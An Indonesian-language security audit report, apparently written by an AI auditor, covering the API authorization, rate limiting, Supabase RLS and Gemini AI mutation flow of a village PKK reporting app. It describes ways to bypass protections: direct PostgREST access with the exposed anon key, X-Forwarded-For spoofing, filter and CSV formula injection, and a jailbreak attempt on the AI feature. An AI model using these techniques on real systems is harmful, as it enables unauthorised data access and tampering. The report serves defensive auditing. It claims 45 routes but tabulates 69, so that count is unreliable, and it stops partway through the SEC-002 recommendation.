# Laporan Audit Keamanan & Matriks Otorisasi API (Aspek 1: Keamanan)
**Aplikasi:** Rekapitulasi TP PKK Desa Belikurip (Next.js 16.2.5 + Supabase + Gemini AI)  
**Auditor:** Security & API Authorization Auditor (`teamwork_preview_explorer`)  
**Tanggal Audit:** 12 Oktober 2026  
**Status Audit:** Selesai (Analisis Statis & Inspeksi Mendalam — Read-Only)

---

## 1. Ringkasan Eksekutif & Postur Keamanan

Audit keamanan menyeluruh telah dilakukan terhadap seluruh endpoint API (`app/api/**/route.js`, total **45 file rute**), lapisan autentikasi (`lib/auth.js`, `proxy.js`), pembatas laju request (`lib/rate-limit.js`), modul integrasi basis data (`lib/supabase.js`), modul mutasi AI (`lib/aiMutation.js`, `/api/chat`), serta mekanisme proteksi data baris (*Row-Level Access Control*).

### Ringkasan Postur Keamanan Saat Ini
1. **Autentikasi & Proxy:**
   - Proxy Next.js 16 (`proxy.js`) telah mengimplementasikan verifikasi JWT dengan benar untuk rute `/dashboard/*`.
   - Modul `lib/auth.js` memvalidasi keberadaan `JWT_SECRET` pada saat *module load* (fail-fast).
   - Penggunaan cookie berflag `httpOnly: true` dan masa aktif 24 jam sudah diterapkan saat login.
2. **Otorisasi Endpoint API:**
   - Seluruh 45 rute API memiliki otorisasi internal di masing-masing *route handler*, mematuhi prinsip bahwa *route handler* di Next.js App Router adalah endpoint publik yang wajib memverifikasi hak akses secara mandiri.
   - Endpoint data utama (`data-umum`, `pokja1`-`pokja4`, `rekap-dawis`, `bumil`) telah menggunakan abstraksi `createPokjaHandler` yang menerapkan pemeriksaan hak akses tingkat tabel (`canWrite`) dan tingkat baris (`canWriteRow`).
3. **Isolasi Kader Dusun (Migrasi v5):**
   - 9 role kader dusun (`dusun_soko` s.d. `dusun_banyuripan`) memiliki isolasi baris (*row-level scope*) yang ketat pada input data manual (`createPokjaHandler`), proposal mutasi AI (`validateAiMutation`), dan impor Excel (`importToSupabase`). Server secara aktif menimpa (*override*) `payload.dusun_id = user.dusun_id` untuk mencegah manipulasi (*anti-tamper*).
4. **Keamanan Mutasi AI:**
   - Integrasi Gemini AI menerapkan pola *dry-run* dua tahap yang aman: `/api/chat` hanya menghasilkan pratinjau perubahan (*mutation preview*), sedangkan eksekusi baru dilakukan di `/api/chat/confirm-mutation` dengan validasi ulang server-side penuh terhadap whitelist tabel/kolom dan role dari JWT.

### Temuan Kritis & Utama yang Memerlukan Tindakan
Meskipun otorisasi di lapisan aplikasi Next.js dirancang dengan baik, audit mengidentifikasi sejumlah celah keamanan signifikan:
- **[SEC-001 - Kritis] Database Row Level Security (RLS) Belum Aktif di Supabase:** Seluruh tabel PostgreSQL tidak memiliki RLS, sementara `NEXT_PUBLIC_SUPABASE_ANON_KEY` terekspos di browser client. Penyerang dapat memanggil Supabase PostgREST API langsung dan mem-bypass proteksi Next.js.
- **[SEC-002 - Tinggi] Impor Excel Mem-bypass Period Lock:** Endpoint `/api/import/confirm` tidak memvalidasi status penguncian periode (`checkPeriodLock`), memungkinkan operator/kader menimpa data pada periode yang berstatus `locked`.
- **[SEC-003 - Tinggi] Kerentanan PostgREST Filter Injection:** Klausa `.or(...)` pada endpoint log audit menyambungkan parameter pencarian `dusun`/`desa` secara mentah tanpa sanitasi.
- **[SEC-004 - Tinggi] Formula Injection / CSV Injection (CWE-1236):** Ekspor CSV audit log dan ekspor Excel tidak memvalidasi karakter awal formula (`=`, `+`, `-`, `@`), berpotensi memicu eksekusi formula saat dibuka di Microsoft Excel.
- **[SEC-005 - Sedang] IP Extraction Rate Limiter Rentan Spoofing:** `x-forwarded-for` diambil elemen pertamanya tanpa validasi *trusted proxy*, membuka celah *rate limit bypass*.
- **[SEC-006 - Sedang] Regex Parser Cookie `auth-token` Kurang Presisi:** Potensi *cookie confusion* jika terdapat nama cookie lain yang berakhiran `auth-token`.
- **[SEC-007 - Sedang] Ketiadaan Rate Limiting pada Rute AI Chat & Ekspor:** Risiko *Denial of Wallet* (eksploitasi kuota Gemini) dan DoS sumber daya server.
- **[SEC-008 - Rendah] Inkonsistensi Flag Cookie Logout & Ketiadaan Token Revocation.**
- **[SEC-009 - Rendah] Ketiadaan Audit Log pada Operasi Manajemen Pengguna.**

---

## 2. Matriks Otorisasi API Lengkap (45 Rute)

Tabel berikut mencakup **seluruh 45 rute** di bawah `app/api/**/route.js`, metode HTTP yang didukung, helper autentikasi, role yang diizinkan, mekanisme verifikasi baris, serta catatan keamanan.

| No | Path Rute API | Metode | Helper Auth | Role Diizinkan | Cek Row-Level? | Catatan Keamanan & Temuan Terkait |
|:---|:---|:---:|:---|:---|:---:|:---|
| 1 | `/api/admin/backup` | GET | `requireAdmin` | `admin` | N/A | Mengembalikan HTTP 410 Gone (SQLite deprecated). Aman. |
| 2 | `/api/admin/backup` | POST | `requireAdmin` | `admin` | N/A | Mengembalikan HTTP 410 Gone (SQLite deprecated). Aman. |
| 3 | `/api/admin/column-overrides` | GET | `requireAuth` | Semua user login | N/A | Read-only daftar override kolom standar untuk render UI. |
| 4 | `/api/admin/column-overrides` | POST | `requireAdmin` | `admin` | N/A | Upsert label/hide kolom standar. Whitelist validasi aktif. Dicatat di audit log. |
| 5 | `/api/admin/column-overrides` | DELETE | `requireAdmin` | `admin` | N/A | Reset override kolom. Dicatat di audit log. |
| 6 | `/api/admin/columns` | GET | `requireAuth` | Semua user login | N/A | Read-only definisi kolom dinamis (`table_schemas`). |
| 7 | `/api/admin/columns` | POST | Custom (`user.role === 'admin'`) | `admin` | N/A | Tambah kolom dinamis. Sanitasi nama kolom regex `/^[a-z][a-z0-9_]{1,63}$/`. Tidak ada audit log (`SEC-009`). |
| 8 | `/api/admin/columns` | DELETE | Custom (`user.role === 'admin'`) | `admin` | N/A | Hapus definisi kolom dinamis berdasarkan id integer. Tidak ada audit log (`SEC-009`). |
| 9 | `/api/admin/desa` | GET | `requireAdmin` | `admin` | N/A | Deprecated alias untuk `/api/admin/dusun`. Header `Deprecation` terpasang. |
| 10 | `/api/admin/desa` | PUT | `requireAdmin` | `admin` | N/A | Deprecated alias update desa/dusun (nama, is_active). |
| 11 | `/api/admin/dusun` | GET | `requireAdmin` | `admin` | N/A | Canonical list dusun untuk panel admin. |
| 12 | `/api/admin/dusun` | PUT | `requireAdmin` | `admin` | N/A | Update nama & toggle aktif dusun. Memanggil `invalidateDusunServerCache()`. Tidak ada audit log (`SEC-009`). |
| 13 | `/api/admin/logs` | GET | `requireAdmin` | `admin` | N/A | Filter log audit. **Rentan PostgREST injection** pada parameter `dusun`/`desa` (`SEC-003`). |
| 14 | `/api/admin/logs/export` | GET | `requireAdmin` | `admin` | N/A | Ekspor CSV log audit (maks 5000 baris). **Rentan Formula Injection / CSV Injection** (`SEC-004`) dan PostgREST injection (`SEC-003`). |
| 15 | `/api/admin/users` | GET | `requireAdmin` | `admin` | N/A | List user (hanya ID, username, nama, role, dusun_id, created_at; password hash tidak diekspos). |
| 16 | `/api/admin/users` | POST | `requireAdmin` | `admin` | N/A | Buat user baru. Validasi panjang password >= 12, regex username, auto-resolve dusun_id untuk kader. Tidak ada audit log (`SEC-009`). |
| 17 | `/api/admin/users` | PUT | `requireAdmin` | `admin` | N/A | Update user (role, nama, password). Mencegah admin menghapus/menurunkan akun diri sendiri. Tidak ada audit log (`SEC-009`). |
| 18 | `/api/admin/users` | DELETE | `requireAdmin` | `admin` | N/A | Hapus user. Mencegah hapus akun admin terakhir / default. Mengosongkan `user_id` di `audit_logs` untuk FK safety. Tidak ada audit log (`SEC-009`). |
| 19 | `/api/admin/years` | GET | `requireAdmin` | `admin` | N/A | List semua tahun laporan (aktif + non-aktif). |
| 20 | `/api/admin/years` | POST | `requireAdmin` | `admin` | N/A | Tambah tahun (2000-2100). Dicatat di audit log. |
| 21 | `/api/admin/years` | PATCH | `requireAdmin` | `admin` | N/A | Toggle aktif/non-aktif tahun. Dicatat di audit log. |
| 22 | `/api/admin/years` | DELETE | `requireAdmin` | `admin` | N/A | Hapus tahun dari dropdown. Dicatat di audit log. |
| 23 | `/api/auth` | POST | Public + DB Rate Limiter | Public | N/A | Login user. Rate limiter 5 percobaan/15 menit/IP. **IP extraction rentan spoofing** (`SEC-005`). Set cookie JWT httpOnly 24 jam. |
| 24 | `/api/auth` | DELETE | Public | Public | N/A | Logout user. Clear cookie `auth-token`. **Inkonsistensi atribut cookie** (missing `secure`, `sameSite`) (`SEC-008`). |
| 25 | `/api/auth/me` | GET | Custom (`getAuthUser`) | Semua user login | N/A | Info profil user saat ini + re-fetch `dusun_id` terkini dari database. |
| 26 | `/api/auth/me/activity` | GET | Custom (`getAuthUser`) | Semua user login | ✅ Ya (`user_id = user.userId`) | Riwayat audit log milik user sendiri (30 hari terakhir, maks 20 baris). Terisolasi per user. |
| 27 | `/api/auth/password` | POST | Custom (`getAuthUser`) | Semua user login | ✅ Ya (`id = user.userId`) | Ganti password mandiri. Minimal 12 karakter. Verifikasi password lama dengan bcrypt. Tidak ada rate limit (`SEC-007`), tidak ada audit log (`SEC-009`). |
| 28 | `/api/bumil` | GET | `createPokjaHandler` (`requireAuth`) | Semua user login | N/A (read-all) | Data Bumil per-bulan (`requireMonth: true`). Read-all sesuai transparansi PKK. |
| 29 | `/api/bumil` | POST | `createPokjaHandler` (`canWrite`) | `admin`, 9 role `dusun_*` | ✅ Ya (`payload.dusun_id = user.dusun_id` & `canWriteRow`) | Server overwrite dusun_id untuk kader, cek period lock. Pokja1-4 & role user ditolak (403). |
| 30 | `/api/chat` | POST (JSON) | Custom (`getAuthUser`) | Semua user login | ✅ Ya (`validateAiMutation` enforces dusun) | Chat AI Gemini. Max 2000 char, 12 history. Function call `update_dusun_data` menghasilkan **dry-run preview saja**. Tidak ada rate limit (`SEC-007`). |
| 31 | `/api/chat` | POST (Multipart) | Custom (`getAuthUser`) | Semua user login | N/A (preview only) | Upload file Excel (.xlsx maks 5MB, ZIP PK header validation) untuk dipetakan oleh AI ke skema DB. Menghasilkan preview, belum menyimpan. |
| 32 | `/api/chat/confirm-mutation` | POST | Custom (`getAuthUser`) | `admin`, role berwenang per tabel | ✅ Ya (`validateAiMutation` re-checks `user.dusun_id`) | Eksekusi mutasi AI setelah user klik "Terapkan". **Validasi ulang penuh server-side** (role dari JWT, bukan client), cek period lock, catat audit log `ai_update`. |
| 33 | `/api/chat/import-confirm` | POST | Re-export `/api/import/confirm` | Mengikuti rute import | Mengikuti rute import | Alias kompatibilitas mundur untuk chat widget. Menggunakan logika yang sama dengan `/api/import/confirm`. |
| 34 | `/api/data-umum` | GET | `createPokjaHandler` (`requireAuth`) | Semua user login | N/A (read-all) | Data Umum (per-bulan sejak v12). Read-all untuk transparansi PKK. |
| 35 | `/api/data-umum` | POST | `createPokjaHandler` (`canWrite`) | `admin`, 9 role `dusun_*` | ✅ Ya (`payload.dusun_id = user.dusun_id` & `canWriteRow`) | Upsert data umum. Server overwrite dusun_id untuk kader, cek period lock. Pokja1-4 & role user ditolak. |
| 36 | `/api/desa` | GET | `requireAuth` | Semua user login | N/A | Deprecated alias untuk `/api/dusun`. Header `Deprecation` & `Sunset` terpasang. |
| 37 | `/api/dusun` | GET | `requireAuth` | Semua user login | N/A | Canonical list dusun aktif dengan server-side memory cache (TTL 60s). |
| 38 | `/api/export/excel` | GET | `requireAuth` | Semua user login | N/A (read-all export) | Ekspor file Excel pixel-perfect (Annex A-F, Data Umum). Didukung filter tabel/tahun/bulan. **Rentan Formula Injection pada sel keterangan** (`SEC-004`). Tidak ada rate limit (`SEC-007`). Dicatat di audit log. |
| 39 | `/api/export/template` | GET | `requireAuth` | Semua user login | N/A | Unduh file template kosong Excel per tabel dengan nama dusun prefilled. |
| 40 | `/api/export/word` | GET | `requireAuth` | Semua user login | N/A | Ekspor dokumen Word (.docx) Pokja I-IV landscape. Dicatat di audit log. Tidak ada rate limit (`SEC-007`). |
| 41 | `/api/import/confirm` | POST | `requireAuth` | `admin`, pokja terkait, `dusun_*` terkait | ✅ Ya (`importToSupabase` filter `own_dusun`) | Simpan data import Excel ke DB. Server re-resolves nama dusun ke ID. Kader dusun dibatasi ke baris dusunnya sendiri. **KERENTANAN: Tidak ada pengecekan period lock (`SEC-002`)**. |
| 42 | `/api/import/excel` | POST | `requireAuth` | Semua user login | N/A (preview only) | Upload file Excel (.xlsx maks 5MB, ZIP PK header validation) untuk menghasilkan diff preview. Belum menyimpan ke DB. |
| 43 | `/api/import/preview` | POST | `requireAuth` | Semua user login | N/A (preview only) | Membandingkan data parsed Excel terhadap DB untuk menghasilkan diff. Belum menyimpan ke DB. |
| 44 | `/api/kegiatan-warga` | GET | `createPokjaHandler` (`requireAuth`) | Semua user login | N/A | Deprecated alias untuk `/api/rekap-dawis`. Handler otomatis me-normalize target ke `data_rekap_dawis`. |
| 45 | `/api/kegiatan-warga` | POST | `createPokjaHandler` (`canWrite`) | `admin`, 9 role `dusun_*` | ✅ Ya (`payload.dusun_id = user.dusun_id`) | Deprecated alias POST kegiatan warga. Dinormalisasi ke `data_rekap_dawis`. |
| 46 | `/api/notifications` | GET | `requireAuth` | Semua user login | ✅ Ya (`user_id = user.userId`) | Daftar notifikasi in-app untuk user login. Terisolasi per user. |
| 47 | `/api/notifications/mark-read` | POST | `requireAuth` | Semua user login | ✅ Ya (`user_id = user.userId`) | Tandai notifikasi dibaca (spesifik IDs atau all=true). Terisolasi per user. |
| 48 | `/api/periods` | GET | `requireAuth` | Semua user login | N/A | Cek status workflow periode (`report_periods`). |
| 49 | `/api/periods` | POST | `requireAuth` + `canPerformAction` | submit: write-roles; approve/return/lock/unlock: `admin` | ✅ Ya (submit role-checked; approve/lock admin-only) | Transisi status periode (draft -> submitted -> approved -> locked). Validasi transisi state machine. Catat audit log & trigger notifikasi in-app. |
| 50 | `/api/periods/queue` | GET | `requireAuth` | Semua user login | ✅ Ya (admin: semua submitted; operator: hanya yang dia ajukan) | Antrian review periode untuk admin & widget pekerjaan operator. |
| 51 | `/api/pokja1` | GET | `createPokjaHandler` (`requireAuth`) | Semua user login | N/A (read-all) | Data Pokja I. |
| 52 | `/api/pokja1` | POST | `createPokjaHandler` (`canWrite`) | `admin`, `pokja1` | N/A (scope `all` untuk pokja) | Upsert data Pokja I. Pokja 2-4, kader-dusun, dan user ditolak (403). Period lock diperiksa. |
| 53 | `/api/pokja2` | GET | `createPokjaHandler` (`requireAuth`) | Semua user login | N/A (read-all) | Data Pokja II. |
| 54 | `/api/pokja2` | POST | `createPokjaHandler` (`canWrite`) | `admin`, `pokja2` | N/A (scope `all` untuk pokja) | Upsert data Pokja II. Pokja 1, 3, 4, kader-dusun, dan user ditolak (403). Period lock diperiksa. |
| 55 | `/api/pokja3` | GET | `createPokjaHandler` (`requireAuth`) | Semua user login | N/A (read-all) | Data Pokja III. |
| 56 | `/api/pokja3` | POST | `createPokjaHandler` (`canWrite`) | `admin`, `pokja3` | N/A (scope `all` untuk pokja) | Upsert data Pokja III. Pokja 1, 2, 4, kader-dusun, dan user ditolak (403). Period lock diperiksa. |
| 57 | `/api/pokja4` | GET | `createPokjaHandler` (`requireAuth`) | Semua user login | N/A (read-all) | Data Pokja IV. |
| 58 | `/api/pokja4` | POST | `createPokjaHandler` (`canWrite`) | `admin`, `pokja4` | N/A (scope `all` untuk pokja) | Upsert data Pokja IV. Pokja 1-3, kader-dusun, dan user ditolak (403). Period lock diperiksa. |
| 59 | `/api/public/desa/[id]` | GET | Public (Tanpa Auth) | Public | N/A | Deprecated redirect 308 ke `/api/public/dusun/[id]`. Header `Deprecation` terpasang. |
| 60 | `/api/public/dusun/[id]` | GET | Public (Tanpa Auth) | Public | N/A | Detail dusun publik. Menggunakan `supabaseAnon`. **Hanya mengembalikan kolom allowlist** (`PUBLIC_COLUMNS`), tanpa PII. Tidak ada rate limit (`SEC-007`). |
| 61 | `/api/public/summary` | GET | Public (Tanpa Auth) | Public | N/A | Ringkasan agregat publik untuk portal depan. Menggunakan `supabaseAnon`. Menggunakan allowlist kolom agregat. Tidak ada rate limit (`SEC-007`). |
| 62 | `/api/rekap` | GET | `requireAuth` | Semua user login | N/A | Agregat dashboard admin & grafik. Evaluasi kelengkapan data (*completeness check*) per dusun. |
| 63 | `/api/rekap/desa/[id]` | GET | `requireAuth` | Semua user login | N/A | Deprecated redirect 308 ke `/api/rekap/dusun/[id]`. |
| 64 | `/api/rekap/dusun/[id]` | GET | `requireAuth` | Semua user login | N/A | Drill-down data lengkap per dusun untuk internal dashboard. Mengembalikan semua kolom (termasuk non-allowlist). |
| 65 | `/api/rekap/trend` | GET | `requireAuth` | Semua user login | N/A | Agregat tren 5 tahun (data umum, pokja4, bumil). Parameter `dusun_ids` (alias `desa_ids`). |
| 66 | `/api/rekap-dawis` | GET | `createPokjaHandler` (`requireAuth`) | Semua user login | N/A (read-all) | Data Rekap Dawis (per-bulan sejak v10). |
| 67 | `/api/rekap-dawis` | POST | `createPokjaHandler` (`canWrite`) | `admin`, 9 role `dusun_*` | ✅ Ya (`payload.dusun_id = user.dusun_id` & `canWriteRow`) | Upsert data rekap dawis. Server overwrite dusun_id untuk kader, cek period lock. Pokja1-4 & role user ditolak. |
| 68 | `/api/reports/build` | POST | `requireAuth` | Semua user login | N/A | Custom report generator (Excel/Word/PDF). Filter tahun, dusun, kolom, tabel. Tidak ada audit log (`SEC-009`) dan tidak ada rate limit (`SEC-007`). |
| 69 | `/api/years` | GET | `requireAuth` | Semua user login | N/A | Daftar tahun aktif untuk dropdown UI dengan fallback otomatis current year ±2. |

---

## 3. Hasil Inspeksi Mendalam (Deep Security Inspection)

### 3.1 Autentikasi & Manajemen Sesi (Auth & Session)
1. **Validasi Kunci Rahasia:**
   - `lib/auth.js:9-12` melempar pengecualian fatal (`throw new Error(...)`) jika `process.env.JWT_SECRET` tidak disetel saat runtime server. Ini memastikan aplikasi gagal secara aman (*fail-fast*).
2. **Algoritma JWT & Keamanan Verifikasi:**
   - Pembuatan token menggunakan pustaka `jose` dengan algoritma `HS256` eksplisit (`createToken` di `lib/auth.js:33`).
   - Pada saat verifikasi (`verifyToken` di `lib/auth.js:43` dan `proxy.js:30`), `jwtVerify(token, secret)` dipanggil tanpa pembatasan eksplisit parameter opsi `{ algorithms: ['HS256'] }`. Meskipun `jose` memvalidasi kompatibilitas tipe kunci simetris terhadap secret Uint8Array, praktik terbaik pertahanan mendalam (*defense-in-depth*) mewajibkan penentuan whitelist algoritma secara eksplisit untuk mencegah potensi *algorithm confusion*.
3. **Masa Berlaku & Kebijakan Sesi:**
   - Token memiliki masa kedaluwarsa 24 jam (`.setExpirationTime('24h')`). Cookie memiliki `maxAge: 86400` (24 jam).
   - **Ketiadaan Pembatalan Sesi Server-Side:** Token JWT bersifat *stateless* tanpa nomor seri/versi sesi (`token_version` atau session tracking). Jika password diganti atau akun dinonaktifkan, token yang telah beredar di perangkat lain tetap sah hingga 24 jam ke depan.
4. **Atribut Cookie:**
   - Cookie disetel dengan `httpOnly: true`, `secure: process.env.NODE_ENV === 'production'`, `sameSite: 'lax'`, dan `path: '/'` saat login.
   - Namun, saat logout (`app/api/auth/route.js:77-81`), ubah password (`app/api/auth/password/route.js:53-57`), dan pembersihan token di `proxy.js:34`, atribut `secure` dan `sameSite` tidak disertakan saat melakukan `cookies.set('auth-token', '', { httpOnly: true, maxAge: 0, path: '/' })`.

### 3.2 Arsitektur Pembatas Laju (Rate Limiting)
1. **Mekanisme Ekstraksi IP Client (`lib/rate-limit.js:17-23`):**
   ```javascript
   export function getIP(request) {
     return (
       request.headers.get('x-forwarded-for')?.split(',')[0].trim() ||
       request.headers.get('x-real-ip') ||
       'unknown'
     );
   }
   ```
   Pengambilan indeks ke-0 dari header `x-forwarded-for` tanpa validasi apakah request berasal dari *trusted reverse proxy* membuka celah pemalsuan IP (*IP spoofing*). Penyerang dapat mengirimkan header sembarang `X-Forwarded-For: 103.20.1.X` pada setiap request gagal untuk mereset perhitungan batas login.
2. **Kondisi Balapan (Race Condition):**
   - `recordFailedAttempt` melakukan `SELECT` terlebih dahulu, lalu `INSERT` atau `UPDATE`. Serangan konkuren dari IP yang sama dapat menyebabkan *lost updates* pada counter kegagalan.
3. **Cakupan Pembatas Laju:**
   - `checkRateLimit` saat ini **hanya** dipasang pada rute login `/api/auth`.
   - Rute `/api/chat` (konsumsi token Gemini), `/api/auth/password` (brute-force password lama), `/api/export/*` (pembuatan file besar berulang), dan `/api/public/*` (scraping publik) tidak memiliki rate limiter.

### 3.3 Kontrol Akses Baris (Row-Level Access Control & Cadre Isolation)
1. **Isolasi 9 Role Kader Dusun:**
   - Skema v5 mendefinisikan 9 role: `dusun_soko`, `dusun_melikan`, `dusun_jamprit_wetan`, `dusun_jamprit_kulon`, `dusun_belikurip`, `dusun_pagersari`, `dusun_klerong`, `dusun_tanjung`, `dusun_banyuripan`.
   - Pada `lib/auth.js`, role ini memiliki `ROLE_SCOPE = 'own_dusun'`.
   - Pada `lib/api-handler.js:133`, server secara paksa menimpa `payload.dusun_id = Number(user.dusun_id)` dan mengecek `canWriteRow(user, canonicalTable, payload)`.
   - Pada `lib/aiMutation.js:83-87`, proposal mutasi AI menolak jika unit ID tidak cocok dengan `user.dusun_id`.
   - Pada `lib/excel/importToSupabase.js:85-88`, baris yang bukan milik dusun kader otomatis dilewati (`rowLevelSkipped`).
   - Upaya kader mengedit dusun lain tercatat di `audit_logs` dengan aksi `permission_denied`.
2. **Celah Keamanan Period Lock pada Impor:**
   - Pada `api-handler.js` dan `chat/confirm-mutation`, `checkPeriodLock` aktif memblokir input jika periode dikunci.
   - Namun pada `app/api/import/confirm/route.js`, fungsi `checkPeriodLock` **tidak pernah dipanggil**. Kader/operator dapat mengunggah file Excel untuk menimpa data pada periode yang sudah berstatus `locked`.

### 3.4 Supabase & Database Row Level Security (RLS)
1. **Penggunaan Client di Server:**
   - Modul `lib/supabase.js` menginisialisasi `supabase` menggunakan `SUPABASE_SERVICE_ROLE_KEY`. Service role membypass seluruh aturan RLS PostgreSQL secara bawaan.
2. **Ketiadaan RLS pada Skema Database:**
   - Dari inspeksi seluruh 17 berkas SQL migrasi (`supabase_schema.sql` hingga `supabase_schema_updates_v13.sql`), **tidak ditemukan satu pun perintah `ENABLE ROW LEVEL SECURITY` atau `CREATE POLICY`**.
   - Berkas `lib/supabase.js:19-20` secara eksplisit mendokumentasikan: *"RLS tidak aktif pada tabel, sehingga tanpa service role beberapa query admin akan gagal silent..."*
3. **Eksposur Kunci Publik (`NEXT_PUBLIC_`):**
   - Variabel `NEXT_PUBLIC_SUPABASE_URL` dan `NEXT_PUBLIC_SUPABASE_ANON_KEY` disematkan ke bundle browser client.
   - Karena RLS di PostgreSQL dinonaktifkan, siapapun yang memiliki anon key dapat langsung berinteraksi dengan API PostgREST Supabase (`https://<project-ref>.supabase.co/rest/v1/users`) untuk melakukan `SELECT`, `UPDATE`, atau `DELETE` pada tabel `users`, `audit_logs`, dan seluruh tabel data PKK secara langsung, sepenuhnya membypass server Next.js. Ini merupakan risiko arsitektural paling kritis.

### 3.5 Keamanan Mutasi AI (Gemini AI Integration)
1. **Pola Dry-Run Dua Tahap:**
   - Endpoint `/api/chat` memanggil Gemini API dengan deklarasi fungsi `update_dusun_data`.
   - Jika Gemini memanggil fungsi tersebut, server memvalidasi argumen menggunakan `validateAiMutation` dan hanya mengembalikan objek respons berlabel `{ type: 'mutation_preview', mutation: { ... } }`. Tidak ada perubahan yang ditulis ke database pada tahap ini.
   - Eksekusi mutasi hanya dapat dilakukan melalui `POST /api/chat/confirm-mutation`.
2. **Ketahanan Terhadap Prompt Injection:**
   - Bahkan jika penyerang berhasil melakukan *jailbreak* pada instruksi teks AI (misalnya memerintahkan AI mengubah data Pokja 1 sementara user adalah Pokja 2), server pada `/api/chat/confirm-mutation` memvalidasi ulang:
     `if (!allowedTables.includes(tableName)) return NextResponse.json({ error: ... }, { status: 403 });`
   - Otorisasi didasarkan pada JWT pengguna yang diverifikasi di server, bukan teks prompt atau instruksi AI.
3. **Kerentanan DoS / Token Exhaustion:**
   - Rute `/api/chat` tidak dibatasi kuota request per user, memungkinkan pengguna dengan role rendah membanjiri request dan menghabiskan kuota token Gemini API (Denial of Wallet).

### 3.6 Kerentanan Injeksi (Injection Risks)
1. **PostgREST Filter Injection (`admin/logs/route.js:42`, `admin/logs/export/route.js:46`):**
   - Nilai parameter URL `dusun` / `desa` digabungkan secara langsung:
     `query.or(`dusun_nama.eq.${unitNama},desa_nama.eq.${unitNama}`);`
   - Karakter khusus seperti koma atau operator PostgREST tidak difilter, memungkinkan manipulasi klausa filter query.
2. **CSV / Excel Formula Injection (CWE-1236):**
   - Pada ekspor CSV audit log (`/api/admin/logs/export`), field `username`, `detail`, dan `action` langsung diekspor dengan awalan BOM UTF-8 Microsoft Excel.
   - Pada ekspor Excel (`/api/export/excel`), nilai teks bebas seperti `keterangan` langsung disetel ke sel worksheet tanpa pencegahan karakter formula (`=`, `+`, `-`, `@`).
3. **Cross-Site Scripting (XSS):**
   - React 19 melakukan HTML escaping secara default pada JSX expression.
   - `dangerouslySetInnerHTML` hanya digunakan pada `app/layout.js:60` untuk inline theme initialization script statis tanpa interpolasi input pengguna. Risiko XSS tersimpan pada web UI terkendali dengan baik.

### 3.7 Kebocoran Informasi & Jejak Audit (Secret Exposure & Audit Trail)
1. **Kebocoran Pesan Error Database:**
   - Beberapa endpoint (`chat/confirm-mutation`, `import/confirm`, `export/excel`, `reports/build`, `periods/route.js`) mengembalikan `error.message` dari blok catch secara langsung ke klien dalam respons HTTP 500. Hal ini dapat mengekspos nama kolom database, constraint name, atau query fragments.
2. **Hilangnya Jejak Audit Manajemen Akun:**
   - Endpoint `/api/admin/users` tidak memanggil `writeLog` saat membuat, memperbarui role, atau menghapus pengguna.
   - Endpoint `/api/auth/password` tidak memanggil `writeLog` saat pengguna mengganti kata sandi.

---

## 4. Daftar Temuan Terperinci (Detailed Security Findings)

Berikut adalah katalog temuan keamanan yang diidentifikasi selama audit, diurutkan berdasarkan tingkat keparahan (*Severity*).

---

### [SEC-001] Database Row Level Security (RLS) Dinonaktifkan di Seluruh Tabel Supabase Sementara Anon Key Terekspos ke Client
- **ID:** `SEC-001`
- **Aspek:** Keamanan
- **Severity:** **Kritis**
- **Lokasi:** `lib/supabase.js:19-25`, `supabase_schema.sql:1-120`, `supabase_schema_updates_v5.sql:1-200`
- **Deskripsi Masalah:**
  Seluruh tabel di PostgreSQL Supabase (`users`, `audit_logs`, `rate_limits`, `data_umum`, `data_pokja1`-`4`, `data_rekap_dawis`, `data_bumil`, `table_schemas`, `table_column_overrides`, `report_periods`) tidak memiliki konfigurasi `ENABLE ROW LEVEL SECURITY`. Di sisi lain, Next.js mengekspos `NEXT_PUBLIC_SUPABASE_URL` dan `NEXT_PUBLIC_SUPABASE_ANON_KEY` ke bundle browser publik. Komentar di `lib/supabase.js:19-20` secara eksplisit mengakui bahwa RLS tidak aktif.
- **Dampak:**
  Siapapun yang mengakses website dapat menyalin anon key dari network tab / source JS, lalu mengirim request HTTP langsung ke PostgREST Supabase (`https://<project>.supabase.co/rest/v1/...`). Karena tabel tidak ber-RLS, penyerang dapat membaca password hash seluruh user di tabel `users`, mengubah atau menghapus data PKK, memanipulasi audit log, dan mem-bypass seluruh kontrol otorisasi Next.js (`proxy.js`, `requireAuth`, `requireAdmin`, `canWriteRow`).
- **Rekomendasi Konkret:**
  1. Jalankan migrasi SQL untuk mengaktifkan RLS pada seluruh tabel:
     ```sql
     ALTER TABLE users ENABLE ROW LEVEL SECURITY;
     ALTER TABLE audit_logs ENABLE ROW LEVEL SECURITY;
     ALTER TABLE rate_limits ENABLE ROW LEVEL SECURITY;
     ALTER TABLE report_periods ENABLE ROW LEVEL SECURITY;
     ALTER TABLE table_column_overrides ENABLE ROW LEVEL SECURITY;
     ALTER TABLE table_schemas ENABLE ROW LEVEL SECURITY;
     ALTER TABLE data_umum ENABLE ROW LEVEL SECURITY;
     ALTER TABLE data_pokja1 ENABLE ROW LEVEL SECURITY;
     ALTER TABLE data_pokja2 ENABLE ROW LEVEL SECURITY;
     ALTER TABLE data_pokja3 ENABLE ROW LEVEL SECURITY;
     ALTER TABLE data_pokja4 ENABLE ROW LEVEL SECURITY;
     ALTER TABLE data_rekap_dawis ENABLE ROW LEVEL SECURITY;
     ALTER TABLE data_bumil ENABLE ROW LEVEL SECURITY;
     ```
  2. Karena Next.js server menggunakan `service_role` (yang otomatis membypass RLS), blokir seluruh akses langsung dari role `anon` dan `authenticated` pada tabel sensitif/operasional:
     - Izinkan `anon` hanya untuk `SELECT` pada tabel `dusun` dan view agregat publik jika diperlukan.
     - Untuk tabel `users`, `audit_logs`, dan tabel data PKK, jangan buat policy permissive untuk `anon`, sehingga request via anon key ditolak otomatis oleh Supabase PostgREST.

---

### [SEC-002] Impor Excel Mem-bypass Period Lock (`checkPeriodLock` Absen)
- **ID:** `SEC-002`
- **Aspek:** Keamanan
- **Severity:** **Tinggi**
- **Lokasi:** `app/api/import/confirm/route.js:77`, `lib/excel/importToSupabase.js:126-132`
- **Deskripsi Masalah:**
  Ketika periode pelaporan telah dikunci (`status === 'locked'`) oleh admin, endpoint input form manual (`lib/api-handler.js:152`) dan mutasi AI (`app/api/chat/confirm-mutation/route.js:54`) secara tepat memblokir penulisan data oleh non-admin. Namun, endpoint konfirmasi impor Excel (`/api/import/confirm`) dan fungsi `importToSupabase` sama sekali tidak memeriksa status periode (`checkPeriodLock`).
- **Dampak:**
  Operator, kader dusun, atau pengurus pokja dapat mem-bypass status penguncian periode (period lock bypass) dengan cara mengunggah data melalui fitur Impor Excel, merusak integritas data pelaporan yang sudah difinalisasi atau disetujui.
- **Rekomendasi Konkret:**
